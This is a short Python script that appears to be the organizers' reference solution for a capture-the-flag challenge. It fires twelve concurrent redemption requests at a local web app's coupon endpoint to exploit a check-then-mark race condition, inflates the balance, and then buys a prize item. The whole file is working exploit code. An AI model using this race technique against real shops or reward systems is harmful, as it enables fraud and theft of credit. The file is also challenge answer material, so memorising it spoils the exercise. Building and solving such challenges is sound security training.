#!/usr/bin/env python3
"""Reference exploit for organizers. Fires concurrent redeem requests to win
the TOCTOU race, then buys the Temporal Core."""
import concurrent.futures, requests, sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5001"
s = requests.Session()
s.get(BASE + "/")  # get agent badge cookie

def redeem():
    return s.post(BASE + "/api/redeem", json={"code": "TVA-REWIND"}).json()

# 12 simultaneous redeems; most land inside the check/mark window.
with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
    list(ex.map(lambda _: redeem(), range(12)))

print("balance:", s.get(BASE + "/api/state").json())
print("buy:", s.post(BASE + "/api/buy", json={"item": "temporal_core"}).json())
